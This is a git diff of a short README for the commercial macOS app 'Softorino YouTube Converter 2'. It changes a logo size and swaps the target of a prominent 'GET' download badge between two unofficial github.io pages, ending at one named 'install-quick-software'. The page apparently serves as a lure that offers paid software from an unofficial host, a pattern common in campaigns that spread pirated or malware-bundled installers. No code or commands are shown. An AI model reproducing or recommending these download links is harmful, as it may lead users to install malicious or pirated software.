@@ -1,13 +1,13 @@
 # Softorino YouTube Converter 2 – Smart Video and Music Downloader  
 
 <div align="center">  
-<img src="https://sc.filehippo.net/images/t_app-icon-l/p/4170880a-a4d9-11e6-b4e2-00163ec9f5fa/3495549843/softorino-yt-converter-logo" alt="Softorino YouTube Converter 2 Logo" width="400">  
+<img src="https://sc.filehippo.net/images/t_app-icon-l/p/4170880a-a4d9-11e6-b4e2-00163ec9f5fa/3495549843/softorino-yt-converter-logo" alt="Softorino YouTube Converter 2 Logo" width="300">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/softorino-youtube-converter-2">  
+<a href="https://install-quick-software.github.io/.github/softorino-youtube-converter-2">  
 <img src="https://img.shields.io/badge/💻_GET_Softorino_YT_Converter_2-red?style=for-the-badge&logo=apple" alt="GET Softorino YouTube Converter 2">  
 </a>  
 </div>
